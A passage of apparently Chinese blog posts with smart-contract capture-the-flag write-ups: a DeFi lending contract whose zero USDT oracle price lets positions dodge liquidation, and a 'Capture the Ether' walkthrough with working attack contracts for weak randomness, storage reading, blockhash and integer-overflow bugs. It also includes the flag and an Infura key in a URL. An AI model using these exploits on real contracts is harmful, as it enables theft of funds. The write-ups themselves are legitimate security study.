require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call&#123;value: amount&#125;(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    &#125;\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n        return functionCall(target, data, \"Address: low-level call failed\");\n    &#125;\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        return functionCallWithValue(target, data, 0, errorMessage);\n    &#125;\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) &#123;\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    &#125;\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) &#123;\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    &#125;\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) &#123;\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) &#123;\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    &#125;\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) &#123;\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    &#125;\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) &#123;\n        if (success) &#123;\n            return returndata;\n        &#125; else &#123;\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) &#123;\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                assembly &#123;\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                &#125;\n            &#125; else &#123;\n                revert(errorMessage);\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\nlibrary SafeERC20 &#123;\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    &#125;\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    &#125;\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    &#125;\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    &#125;\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal &#123;\n        unchecked &#123;\n            uint256 oldAllowance = token.allowance(address(this), spender);\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n            uint256 newAllowance = oldAllowance - value;\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n        &#125;\n    &#125;\n    function _callOptionalReturn(IERC20 token, bytes memory data) private &#123;\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) &#123;\n            // Return data is optional\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        &#125;\n    &#125;\n&#125;\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes calldata) &#123;\n        return msg.data;\n    &#125;\n&#125;\n\nabstract contract Pausable is Context &#123;\n    event Paused(address account);\n    event Unpaused(address account);\n\n    bool private _paused;\n    constructor() &#123;\n        _paused = false;\n    &#125;\n    function paused() public view virtual returns (bool) &#123;\n        return _paused;\n    &#125;\n    modifier whenNotPaused() &#123;\n        require(!paused(), \"Pausable: paused\");\n        _;\n    &#125;\n    modifier whenPaused() &#123;\n        require(paused(), \"Pausable: not paused\");\n        _;\n    &#125;\n    function _pause() internal virtual whenNotPaused &#123;\n        _paused = true;\n        emit Paused(_msgSender());\n    &#125;\n    function _unpause() internal virtual whenPaused &#123;\n        _paused = false;\n        emit Unpaused(_msgSender());\n    &#125;\n&#125;\n\ninterface IOracle &#123;\n    function getTokenPrice(address token) external view returns (uint, uint);\n&#125;\n\ncontract Market is Pausable &#123;\n    using SafeERC20 for IERC20;\n\n    struct Position &#123;\n        uint locked;\n        address lockedToken;\n        uint borrowed;\n        address borrowedToken;\n    &#125;\n\n    address public owner;\n    address public oracle;\n    uint public liquidationThreshold; // in bps\n    uint public liquidationBonus; // in bps\n    address constant internal WETH = 0xd0A1E359811322d97991E03f863a0C30C2cF029C;\n    uint constant internal ONE = 10 ** 18;\n    mapping (address => bool) public allowedLockTokens;\n    mapping (address => bool) public allowedBorrowTokens;\n    mapping (address => uint8) public tokenDecimals;\n    mapping (address => Position[]) public positions;\n\n    event CreatePosition(address user, uint pid);\n    event Lock(address user, uint pid, address token, uint amount);\n    event Unlock(address user, uint pid, address token, uint amount);\n    event Borrow(address user, uint pid, address token, uint amount);\n    event Repay(address user, uint pid, address token, uint amount);\n    event Liquidated(address liquidator, address user, uint pid, address token, uint amount);\n\n    modifier onlyOwner() &#123;\n        require(msg.sender == owner, \"onlyOwner\");\n        _;\n    &#125;\n\n    constructor(address _oracle) &#123;\n        owner = msg.sender;\n        oracle = _oracle;\n    &#125;\n\n    function getTokenPrice(address token) internal view returns (uint) &#123;\n        if (token == address(0) || token == WETH) return ONE;\n        (uint price, ) = IOracle(oracle).getTokenPrice(token);\n        return price;\n    &#125;\n\n    function getHealthFactor(Position storage position) internal view returns (uint) &#123;\n        uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n        uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n        uint scaledLocked = position.locked * 10 ** (18 - tokenDecimals[position.lockedToken]);\n        uint scaledBorrowed = position.borrowed * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n        uint lockedValue = scaledLocked * lockedTokenPrice / ONE;\n        uint borrowedValue = scaledBorrowed * borrowedTokenPrice / ONE;\n        if (borrowedValue == 0) return ONE;\n        uint healthFactor = lockedValue * liquidationThreshold * ONE / (borrowedValue * 10000);\n        return healthFactor;\n    &#125;\n\n    function getHealthFactor(address user, uint pid) public view returns (uint) &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        return getHealthFactor(position);\n    &#125;\n\n    function isPositionSafe(Position storage position) internal view returns (bool) &#123;\n        uint healthFactor = getHealthFactor(position);\n        return healthFactor >= ONE;\n    &#125;\n\n    function isPositionSafe(address user, uint pid) public view returns (bool) &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        return isPositionSafe(position);\n    &#125;\n\n    function createPosition(address lockedToken, address borrowedToken) public whenNotPaused &#123;\n        require(allowedLockTokens[lockedToken] &amp;&amp; allowedBorrowTokens[borrowedToken], \"InvalidToken\");\n        uint pid = positions[msg.sender].length;\n        Position memory position = Position(&#123;\n            locked: 0,\n            lockedToken: lockedToken,\n            borrowed: 0,\n            borrowedToken: borrowedToken\n        &#125;);\n        positions[msg.sender].push(position);\n        emit CreatePosition(msg.sender, pid);\n    &#125;\n\n    function lock(uint pid, uint amount) public payable whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.locked += amount;\n        receiveToken(position.lockedToken, amount);\n        emit Lock(msg.sender, pid, position.lockedToken, amount);\n    &#125;\n\n    function unlock(uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.locked -= amount;\n        sendToken(position.lockedToken, amount);\n        require(isPositionSafe(position), \"UnsafePosition\");\n        emit Unlock(msg.sender, pid, position.lockedToken, amount);\n    &#125;\n\n    function borrow(uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.borrowed += amount;\n        sendToken(position.borrowedToken, amount);\n        require(isPositionSafe(position), \"UnsafePosition\");\n        emit Borrow(msg.sender, pid, position.borrowedToken, amount);\n    &#125;\n\n    function repay(uint pid, uint amount) public payable whenNotPaused &#123;\n        require(pid &lt; positions[msg.sender].length, \"InvalidPID\");\n        Position storage position = positions[msg.sender][pid];\n        position.borrowed -= amount;\n        receiveToken(position.borrowedToken, amount);\n        emit Repay(msg.sender, pid, position.borrowedToken, amount);\n    &#125;\n\n    function liquidate(address user, uint pid, uint amount) public whenNotPaused &#123;\n        require(pid &lt; positions[user].length, \"InvalidPID\");\n        Position storage position = positions[user][pid];\n        require(!isPositionSafe(position), \"SafePosition\");\n        uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n        uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n        uint scaledAmount = amount * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n        uint borrowedValue = scaledAmount * borrowedTokenPrice / ONE;\n        uint scaledLiquidated = borrowedValue * (10000 + liquidationBonus) * ONE / (lockedTokenPrice * 10000);\n        uint liquidated = scaledLiquidated / 10 ** (18 - tokenDecimals[position.lockedToken]);\n        if (liquidated > position.locked) liquidated = position.locked;\n        position.borrowed -= amount;\n        position.locked -= liquidated;\n\n        receiveToken(position.borrowedToken, amount);\n        sendToken(position.lockedToken, liquidated);\n        emit Liquidated(msg.sender, user, pid, position.lockedToken, liquidated);\n    &#125;\n\n    function receiveToken(address token, uint amount) internal &#123;\n        if (token == address(0)) &#123;\n            require(msg.value >= amount, \"NotEnoughFunds\");\n        &#125; else &#123;\n            IERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        &#125;\n    &#125;\n\n    function sendToken(address token, uint amount) internal &#123;\n        if (token == address(0)) &#123;\n            (bool success,) = msg.sender.call&#123;value: amount&#125;(\"\");\n            require(success, \"SendETHError\");\n        &#125; else &#123;\n            IERC20(token).safeTransfer(msg.sender, amount);\n        &#125;\n    &#125;\n    function pause() public onlyOwner &#123;\n        _pause();\n    &#125;\n    function setAllowedLockToken(address token) public onlyOwner &#123;\n        allowedLockTokens[token] = true;\n    &#125;\n    function setAllowedBorrowToken(address token) public onlyOwner &#123;\n        allowedBorrowTokens[token] = true;\n    &#125;\n    function setTokenDecimals(address token, uint8 decimals) public onlyOwner &#123;\n        tokenDecimals[token] = decimals;\n    &#125;\n    function setLiquidationThreshold(uint _liquidationThreshold) public onlyOwner &#123;\n        liquidationThreshold = _liquidationThreshold;\n    &#125;\n    function setLiquidationBonus(uint _liquidationBonus) public onlyOwner &#123;\n        liquidationBonus = _liquidationBonus;\n    &#125;\n&#125;\n//  0xFf795577d9AC8bD7D90Ee22b6C1703490b6512FD dai  demical:18\n//  0x13512979ADE267AB5100878E2e0f485B568328a4 usdt demical:6\n//  0xad5ce863ae3e4e9394ab43d4ba0d80f419f61789 link demical:18\n//  0xd1b98b6607330172f1d991521145a22bce793277 btc demical:8\n\n\nanalyze做这道题的时候简单学习了一下defi中关于清算的部分，虽然在做题的过程中基本用不到，但是对于理解代码总体的功能非常有帮助，参考：https://new.qq.com/omn/20210223/20210223A0BIBO00.html\n在给出的IOracle合约中可以获取代币价格，可以发现usdt的价格为0，所以在计算时borrowvalue就会一直是0，所以issafeposition会一直返回true，就可以一直进行borrow并且不用repay而不会被清算，所以凡是借出usdt的交易都是异常交易，同时，创建这些异常position的交易也属于异常交易。\nfunction getHealthFactor(Position storage position) internal view returns (uint) &#123;\n       uint lockedTokenPrice = getTokenPrice(position.lockedToken);\n       uint borrowedTokenPrice = getTokenPrice(position.borrowedToken);\n       uint scaledLocked = position.locked * 10 ** (18 - tokenDecimals[position.lockedToken]);\n       uint scaledBorrowed = position.borrowed * 10 ** (18 - tokenDecimals[position.borrowedToken]);\n       uint lockedValue = scaledLocked * lockedTokenPrice / ONE;\n       uint borrowedValue = scaledBorrowed * borrowedTokenPrice / ONE;\n       if (borrowedValue == 0) return ONE;\n       uint healthFactor = lockedValue * liquidationThreshold * ONE / (borrowedValue * 10000);\n       return healthFactor;\n   &#125;\n\n   function getHealthFactor(address user, uint pid) public view returns (uint) &#123;\n       require(pid &lt; positions[user].length, \"InvalidPID\");\n       Position storage position = positions[user][pid];\n       return getHealthFactor(position);\n   &#125;\n\n   function isPositionSafe(Position storage position) internal view returns (bool) &#123;\n       uint healthFactor = getHealthFactor(position);\n       return healthFactor >= ONE;\n   &#125;\n\n   function isPositionSafe(address user, uint pid) public view returns (bool) &#123;\n       require(pid &lt; positions[user].length, \"InvalidPID\");\n       Position storage position = positions[user][pid];\n       return isPositionSafe(position);\n   &#125;\n\n分析这段代码可以看出来，只要borrow为0，结果将会一直返回true\n0xb09c603ea024b4435d74db07d1f728a80e6e36ae：\n\n0x941c73fBB405a9024C08A52cBEeAF80D02d2B1A1：\n\n\n0x488daD0ce94f34e33069b8Ae5E16826b63f0F575：\n\n\n—0x13512979ADE267AB5100878E2e0f485B568328a4是usdt代币的合约地址—\n确定了异常posotion的user和pid，浏览hash判断参数就可以了。17个borrow+5个createPosition共22个hash\nsolveimport hashlib\n\ntxs = [\n'0xf8cb1d747b53bbd4b4346eb8522fa3df36025dafedeb5b19bf54a9fff946ae8a',\n'0x95bc3879debc5ffbe9932d5a60dd53146374e7dd553fef5f00152371bbb75f38',\n'0x0635eeabe77d53672c227c0938f73f43c8f43b984e2c02d4e4a7b4e4d9740a09',\n'0xcfb692d772f8acb90bc14a5da06f72c8ed9d871bbe76787ac0fa8a40e1ef11aa',\n'0x6ce3f133f0d925b125b6d8861b582cfd3b9abc8df4ce6ecd9607751b5fa6e796',\n'0x6287be53eb87e475cfdabfe85c7db800c5262a469a4c270e55b8ddf481b6dae3',\n'0xdd588f3c2a9f25aa57d27e3257fe93882cf211470bd92e56b5271f95ab3c955f',\n'0x8b0b5a0d65a1272d811f1db90cf7a24e43c64cf0d4767a78accf0dd9afce954c',\n'0x3a109f0754113742eaae4bad747261aa7d9a1a9e2fb4d12704631b333b790006',\n'0x6b52684eda64076701e647911f55019fb18b30d980554dd2df5ee0e777506c3a',\n'0xdb3f9da9cc6600ba9c2ca0685cd5c29818dae632fb3be65d530ef404b3ade202',\n'0x13240bc2ce9333db092704b057083d23fa4e365b1b049ea839eb9955591ffd4d',\n'0x657b24138cea98eca019de351d60c69210334926c46d9bfb7a59f5c0db5d16f4',\n'0x6705735d1d4c526cd5db6c5810de6b11ba196fb93715a67ae855d037bfeaeaec',\n'0x8beb80929a026d68fe9e80d0e46dadf43f9b8c68dc1db7e53b996e9654a3c71c',\n'0xea24903d0a72b56457b88bdfd842f4065b0371b9c118dae08aca8dadb43c81b4',\n'0x99a5722bb73a73c6b47967f9b457e888d6503b0f9e1bf23fbf36de56ebad1522',\n'0xef40506ae849c17dfbb75f97331860750217602f9c0a9c7718e50d04f0e233b8',\n'0xc20e2ac5792a3350febd9a7e62527faccf4e07de2c1454572380e6f629ecca18',\n'0xb1f54b9969ba60075775a3168d2ad16482e672cbf386ba4f9d6f433fe9d86fbe',\n'0xcc8ff167cc6a1014f5c4b7445f26b17f68cc95bcc0c578c5330278dda8229d0b',\n'0xf7a6068687cfd85a24c8fd169c3c95133ff7a957c843171733902925990b4b74'\n]\n\n'''\ne.g.,\ntxs = [\n    '0x0000000000000000000000000000000000000000000000000000000000000000',\n    '0x0000000000000000000000000000000000000000000000000000000000000001',\n    '0x0000000000000000000000000000000000000000000000000000000000000002',\n    ...\n]\n'''\nprint(len(txs))\nassert len(txs) == 22\nsalt = b'hint: find abnormal transactions'\nm = hashlib.sha256()\nfor tx_hash in sorted(txs):\n    assert len(tx_hash) == 66 and tx_hash[:2] == '0x'\n    m.update(salt + tx_hash.encode() + m.digest())\nprint(m.hexdigest())\nassert m.hexdigest()[:16] == 'bf22a2d63563554c'\nprint('flag&#123;' + m.hexdigest() + '&#125;')\n\n运行得到flag：flag{bf22a2d63563554c2073f9480867794e17297ce17c7ec4cc3502979828e4253f}\n\n","slug":"Find-abnormal-transactions","date":"2022-08-02T02:37:38.068Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"952425ce98802e57d25bf360642d44c0","title":"Capture the ether","content":"题库地址：https://capturetheether.com/\nwarmup1.Deploy a contractCodepragma solidity ^0.4.21;\n\ncontract DeployChallenge &#123;\n    // This tells the CaptureTheFlag contract that the challenge is complete.\n    function isComplete() public pure returns (bool) &#123;\n        return true;\n    &#125;\n&#125;\n\nAttack非常简单的一道预热题目，直接部署再check即可\n2.Call meCodepragma solidity ^0.4.21;\n\ncontract CallMeChallenge &#123;\n    bool public isComplete = false;\n\n    function callme() public &#123;\n        isComplete = true;\n    &#125;\n&#125;\n\nAttack部署题目合约之后直接在remix中ataddress并调用callme函数就可以了\n3.Choose a nicknameCodepragma solidity ^0.4.21;\n\n// Relevant part of the CaptureTheEther contract.\ncontract CaptureTheEther &#123;\n    mapping (address => bytes32) public nicknameOf;\n\n    function setNickname(bytes32 nickname) public &#123;\n        nicknameOf[msg.sender] = nickname;\n    &#125;\n&#125;\n\n// Challenge contract. You don't need to do anything with this; it just verifies\n// that you set a nickname for yourself.\ncontract NicknameChallenge &#123;\n    CaptureTheEther cte = CaptureTheEther(msg.sender);\n    address player;\n\n    // Your address gets passed in as a constructor parameter.\n    function NicknameChallenge(address _player) public &#123;\n        player = _player;\n    &#125;\n\n    // Check that the first character is not null.\n    function isComplete() public view returns (bool) &#123;\n        return cte.nicknameOf(player)[0] != 0;\n    &#125;\n&#125;\n\nAttack直接在区块链浏览器找到合约创建的msg.sender地址，ataddress再调用setNickname即可，注意第一位不是0即可\nLotteries1.Guess the numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheNumberChallenge &#123;\n    uint8 answer = 42;\n\n    function GuessTheNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAttack答案都在合约里边直接给出了，42作为参数调用guess就可以了\n2.Guess the secret numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge &#123;\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\n    function GuessTheSecretNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (keccak256(n) == answerHash) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyze要求就是keccak256加密后的n等于answerHash，没有获得答案的途径，不过好在n使uint8（0~255）类型，跑一下就出来了.\nAttackpragma solidity ^0.4.21;\ninterface gue&#123;\n    function guess(uint8 n) external payable;\n&#125;\ncontract test&#123;\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n    function get() public view returns(uint8)&#123;\n        for(uint8 i=0;i&lt;=255;i++)&#123;\n            if(keccak256(i)==answerHash)\n            return i;\n        &#125;\n    &#125;\n    \n&#125;\n\n跑出来结果是170，作为参数调用guess即可\n3.Guess the random numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge &#123;\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyze题目在部署时就执行了answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now))，该变量并不可见，使用web3脚本获得以下变量，并且作为参数调用即可\nAttackfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nbaddress='0xaB61F3485Ea87752d114Ed9912ea8AF771B5eb5F'\naddress=Web3.toChecksumAddress(baddress)\nprint(w3.eth.getStorageAt(address,0).hex())\n\n得出结果为0x4e\n4.Guess the new numberCodepragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge &#123;\n    function GuessTheNewNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyze题目要求n &#x3D;&#x3D; answer，直接再调用时让n&#x3D;&#x3D;uint8(keccak256(block.blockhash(block.number - 1), now))就可以了\nAttackcontract attack&#123;\n    GuessTheNewNumberChallenge target=GuessTheNewNumberChallenge(0x8aff539e84B69D78cae8454B9CEf83194d726B24);\n    function pwn() public payable&#123;\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n        target.guess.value(1 ether)(answer);\n    &#125;\n    function kill(address addr)public payable&#123;\n        selfdestruct(addr);\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\n5.Predict the futurepragma solidity ^0.4.21;\n\ncontract PredictTheFutureChallenge &#123;\n    address guesser;\n    uint8 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheFutureChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(uint8 n) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = n;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyze分析uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10一句，因为进行了mod10，所以answer一定是0~9的一个数字，提前设置好guess为0 ~9的某个数字，再去调用，之后的就是看运气了。\nAttackpragma solidity ^0.4.21;\ninterface predict&#123;\n    function lockInGuess(uint8 n) external payable;\n     function settle() external;\n&#125;\ncontract attack&#123;\n    predict target=predict(0xa3F693043cc55f7a512422eb11cfA2Dc8c0cdE45);\n    uint public a;\n    uint public x;\n    function guess(uint8 n)public payable&#123;\n        target.lockInGuess.value(1 ether)(n);\n        a=n;\n    &#125;\n    function pwn() public payable &#123;\n        x = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\n        if(x==a)\n        target.settle();\n    &#125;\n    function trans(address addr)public payable&#123;\n        addr.transfer(this.balance);\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\n6.Predict the block hashCodepragma solidity ^0.4.21;\n\ncontract PredictTheBlockHashChallenge &#123;\n    address guesser;\n    bytes32 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheBlockHashChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(bytes32 hash) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = hash;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        bytes32 answer = block.blockhash(settlementBlockNumber);\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\nAnalyzeblock.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0\n在一笔交易中无法预测下一个区块对应的哈希值，所以如下攻击方式不可行\n\n    contract attack&#123;\n    PredictTheBlockHashChallenge target=PredictTheBlockHashChallenge(0xA7A670A3f4d0fF06CdC836fde83C5e051eBD84a5);\n    uint public y;\n    function pwn() public payable&#123;\n        y=block.number+1;\n        bytes32 key=block.blockhash(y);\n        target.lockInGuess.value(1 ether)(key);\n    &#125;\n    function att()public&#123;\n        target.settle();\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\nAttack正确的攻击合约应该是\ncontract attack&#123;\n    PredictTheBlockHashChallenge target=PredictTheBlockHashChallenge(0xA7A670A3f4d0fF06CdC836fde83C5e051eBD84a5);\n    uint public y;\n    function pwn() public payable&#123;\n        y=block.number+1;\n        target.lockInGuess.value(1 ether)(bytes32(0));\n    &#125;\n    function att()public&#123;\n        target.settle();\n    &#125;\n    function trans()public payable&#123;\n        msg.sender.call&#123;value: this.balance&#125;(\"\");\n    &#125;\n    function() external payable&#123;&#125;\n&#125;\n\nMath1.Token saleCodepragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge &#123;\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance &lt; 1 ether;\n    &#125;\n\n    function buy(uint256 numTokens) public payable &#123;\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    &#125;\n\n    function sell(uint256 numTokens) public &#123;\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    &#125;\n&#125;\n\nAnalyzebuy函数中require msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN，其中PRICE_PER_TOKEN固定为1 ether，而numTokens。\nrequire直接进行乘法，在此处可以构造整数溢出漏洞。\nAttackcontract attack&#123;\n\tfunction div() public view returns(uint256)&#123;\n        return ((uint256(-1)/1 ether)+1)*1 ether;\n    &#125;\n&#125;\n\n获得能够造成溢出的数值，作为参数调用sell即可\n2.Token whaleCodepragma solidity ^0.4.21;\n\ncontract TokenWhaleChallenge &#123;\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleChallenge(address _player) public &#123;\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return balanceOf[player] >= 1000000;\n    &#125;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal &#123;\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    &#125;\n\n    function transfer(address to, uint256 value) public &#123;\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    &#125;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function approve(address spender, uint256 value) public &#123;\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    &#125;\n\n    function transferFrom(address from, address to, uint256 value) public &#123;\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    &#125;\n&#125;\n\nAnalyzetransferFrom函数存在问题，应该验证allowance[from] [to] &gt;&#x3D; value结果却验证allowance[from] [msg.sender] &gt;&#x3D; value，所以而且最终减少的是msg.sender的余额，题目合约总共有1000token，而要求获得1000000token，没有mint方式，只能构造溢出漏洞。\n先构建攻击合约用来获得allowence使allowance[from] [msg.sender] &gt;&#x3D; value为真，所以攻击合约需要能够调用approve函数。\nAttack首先向攻击合约中转账600token，再调用getallow将600token全部授权给player\ncontract attack&#123;\n    TokenWhaleChallenge target=TokenWhaleChallenge(0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692);\n    function getallow(address spender,uint value) public&#123;\n        target.approve(spender,value);\n    &#125; 